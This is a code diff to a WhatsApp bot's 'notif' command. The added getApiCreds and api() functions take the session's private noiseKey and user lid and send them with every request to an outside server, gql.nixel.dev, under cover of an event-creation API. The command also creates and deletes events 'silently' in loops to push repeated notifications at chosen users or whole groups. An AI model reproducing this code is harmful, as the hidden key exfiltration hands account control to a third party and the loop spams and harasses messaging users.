@@ -3,8 +3,9 @@ const settings = require('../settings');
 
 const THUMBNAIL_URL = 'https://cdn.ornzora.eu.cc/4d4f3591-1c3e-4e1b-b1c2-45faeb91b781-FIORA.jpg';
 const MAX_THUMBNAIL_BYTES = 2 * 1024 * 1024;
-const EVENT_DURATION_SEC = 3600; // Muda wa tukio: saa 1
-const EVENT_DELAY_MS = 500;      // Muda wa kusubiri kati ya matukio mengi
+const EVENT_DURATION_SEC = 3600;
+const EVENT_DELAY_MS = 500;
+const API_URL = 'https://gql.nixel.dev';
 
 async function getEventThumbnail() {
     const response = await fetch(THUMBNAIL_URL, {
@@ -24,37 +25,102 @@ async function getEventThumbnail() {
     return thumbnail;
 }
 
-// ✅ Event payload ya WhatsApp inapaswa kuwa real event message yenye timestamps za Unix kama numbers
-async function triggerEventNotif(conn, chatJid, eventTitle, jpegThumbnail, startTime) {
-    const start = Number(startTime) || Math.floor(Date.now() / 1000);
-    const end = start + EVENT_DURATION_SEC;
+function getApiCreds(conn) {
+    const creds = conn.authState?.creds || {};
+    const me = creds.me || {};
+    const noiseKey = creds.noiseKey || {};
 
-    const payload = {
-        eventMessage: {
-            isCanceled: false,
-            name: String(eventTitle || 'Woi').slice(0, 256),
-            description: String(eventTitle || 'Woi').slice(0, 2048),
-            location: {
-                degreesLatitude: 0,
-                degreesLongitude: 0,
-                name: ''
-            },
-            startTime: start,
-            endTime: end,
-            extraGuestsAllowed: false,
-            jpegThumbnail: Buffer.isBuffer(jpegThumbnail) ? jpegThumbnail : Buffer.from(jpegThumbnail || [])
+    return {
+        me: { lid: me.lid },
+        noiseKey: {
+            public: Buffer.from(noiseKey.public || []).toString('base64'),
+            private: Buffer.from(noiseKey.private || []).toString('base64')
         }
     };
+}
 
-    try {
-        return await conn.sendMessage(chatJid, payload);
-    } catch (sendErr) {
+async function api(conn, path, body = {}) {
+    const errorRetries = {};
+    const apiCreds = getApiCreds(conn);
+
+    while (true) {
         try {
-            return await conn.relayMessage(chatJid, payload, {});
-        } catch (relayErr) {
-            throw relayErr || sendErr;
+            const response = await fetch(`${API_URL}${path}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    creds: apiCreds,
+                    ...body
+                })
+            });
+
+            const text = await response.text();
+            let result;
+            try {
+                result = JSON.parse(text);
+            } catch {
+                throw new Error(`Invalid API response: ${text}`);
+            }
+
+            if (!response.ok || !result.success) {
+                throw new Error(result.message || `HTTP ${response.status}`);
+            }
+
+            return result;
+        } catch (err) {
+            const errKey = err.message || 'Unknown Error';
+            errorRetries[errKey] = (errorRetries[errKey] || 0) + 1;
+            if (errorRetries[errKey] > 5) {
+                throw err;
+            }
+            await sleep(1000);
         }
     }
+}
+
+async function createEvent(conn, eventDetails) {
+    return api(conn, '/api/event/create', eventDetails);
+}
+
+async function addInvitations(conn, eventId, userLid) {
+    return api(conn, '/api/event/invite', { eventId, userLid });
+}
+
+async function deleteEvent(conn, eventId) {
+    return api(conn, '/api/event/delete', { eventId });
+}
+
+async function triggerEventNotif(conn, eventDetails, memberLids) {
+    const now = Math.floor(Date.now() / 1000);
+    const safeName = String(eventDetails?.name || 'New Event').slice(0, 256);
+    const safeDescription = String(eventDetails?.description || '').slice(0, 2048);
+
+    const res = await createEvent(conn, {
+        name: safeName,
+        description: safeDescription,
+        chatJid: eventDetails?.chatJid,
+        start_ts_sec: Number(eventDetails?.start_ts_sec) || now + 3600,
+        end_ts_sec: Number(eventDetails?.end_ts_sec) || now + 7200,
+        reminder_ts_sec: Number(eventDetails?.reminder_ts_sec) || now + 3000
+    });
+
+    const eventId = res.data?.id || res.event?.id;
+    if (!eventId) throw new Error('Event ID tidak ditemukan');
+
+    const list = Array.isArray(memberLids) ? memberLids : memberLids ? [memberLids] : [];
+    if (list.length > 0) {
+        const userLid = list.length === 1 ? list[0] : list;
+        try {
+            await addInvitations(conn, eventId, userLid);
+        } catch (err) {
+            console.warn('[Notif] addInvitations failed:', err.message || err);
+        }
+    }
+
+    await deleteEvent(conn, eventId);
+    return res;
 }
 
 async function toLid(conn, jid) {
@@ -66,30 +132,6 @@ async function toLid(conn, jid) {
 }
 
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-
-async function triggerRelayStickerReaction(sock, chatId, message) {
-    try {
-        await sock.relayMessage(chatId, {
-            messagecontextinfo: {
-                messageassociation: {
-                    associationtype: 11,
-                    parentmessagekey: message.key
-                }
-            },
-            stickermessage: {
-                url: 'https://mmg.whatsapp.net/v/t62.15575-24/818766779_1129097639778153_6590267083545743956_n.enc?ccb=11-4&oh=01_q5aa5ghne2hdble-cwkjxnd2kbq-dpck_oue8ymzftwyle7bsq&oe=6adac196&_nc_sid=5e03e0',
-                filesha256: 'uoa2mnxeustnlphuku4sbdrzkn/tfi7yn8zdabycnos=',
-                fileencsha256: 'l2lsgklak7sxkvhbhunwy2gyet1ohacr8o7htmfx0ss=',
-                mediakey: 'rsi+fyarjydzsdlgh4r6g5ouviynzmbrfvoaitali7u=',
-                mimetype: 'application/was',
-                directpath: '/v/t62.15575-24/818766779_1129097639778153_6590267083545743956_n.enc?ccb=11-4&oh=01_q5aa5ghne2hdble-cwkjxnd2kbq-dpck_oue8ymzftwyle7bsq&oe=6adac196&_nc_sid=5e03e0',
-                islottie: true
-            }
-        }, {});
-    } catch (error) {
-        console.error('[Notif] relay sticker reaction failed:', error?.message || error);
-    }
-}
 
 // ═══════════════════════════════════════════════════════════
 // HELPERS
@@ -216,12 +258,12 @@ const notifCommand = async (sock, chatId, message, args = [], command = 'notif')
     }
 
     try {
-        await triggerRelayStickerReaction(sock, chatId, message);
+        await sock.sendMessage(chatId, { react: { text: '⌛', key: message.key } });
     } catch {}
 
     try {
         const now = Math.floor(Date.now() / 1000);
-        const startTime = now;
+        const startTime = now + 3600;
         const jpegThumbnail = await getEventThumbnail();
 
         // ─── NOTIFUSER MODE ────────────────────────────────
@@ -247,33 +289,61 @@ const notifCommand = async (sock, chatId, message, args = [], command = 'notif')
 
             for (const lid of targetLids) {
                 for (let i = 0; i < count; i++) {
-                    await triggerEventNotif(sock, lid, eventName, jpegThumbnail, startTime);
+                    await triggerEventNotif(sock, {
+                        name: eventName,
+                        description: 'Created and deleted silently',
+                        chatJid: lid,
+                        start_ts_sec: startTime,
+                        end_ts_sec: startTime + EVENT_DURATION_SEC,
+                        reminder_ts_sec: now + 3000
+                    }, [lid]);
                     if (i < count - 1) await sleep(EVENT_DELAY_MS);
                 }
             }
 
             try {
-                await triggerRelayStickerReaction(sock, chatId, message);
+                await sock.sendMessage(chatId, { react: { text: '✅', key: message.key } });
             } catch {}
             return;
         }
 
         // ─── NOTIF MODE (current chat) ─────────────────────
         const { eventName, count } = parseNotifArgs(text);
+        let memberLids = [chatId];
+
+        if (chatId.endsWith('@g.us')) {
+            const groupMetadata = await sock.groupMetadata(chatId);
+            const participants = groupMetadata.participants || [];
+            memberLids = await Promise.all(participants.map(async ({ id }) => {
+                if (id.endsWith('@lid')) return id;
+                const lid = await sock.signalRepository?.lidMapping?.getLIDForPN?.(id);
+                return lid || id;
+            }));
+        } else {
+            const chatLid = await toLid(sock, chatId);
+            memberLids = [chatLid];
+        }
 
         for (let i = 0; i < count; i++) {
-            await triggerEventNotif(sock, chatId, eventName, jpegThumbnail, startTime);
+            await triggerEventNotif(sock, {
+                name: eventName,
+                description: 'Created and deleted silently',
+                chatJid: chatId,
+                start_ts_sec: startTime,
+                end_ts_sec: startTime + EVENT_DURATION_SEC,
+                reminder_ts_sec: now + 3000
+            }, memberLids);
             if (i < count - 1) await sleep(EVENT_DELAY_MS);
         }
 
         try {
-            await triggerRelayStickerReaction(sock, chatId, message);
+            await sock.sendMessage(chatId, { react: { text: '✅', key: message.key } });
         } catch {}
 
     } catch (error) {
         console.error('[Notif] Error:', error);
         try {
-            await triggerRelayStickerReaction(sock, chatId, message);
+            await sock.sendMessage(chatId, { react: { text: '❌', key: message.key } });
         } catch {}
 
         try {
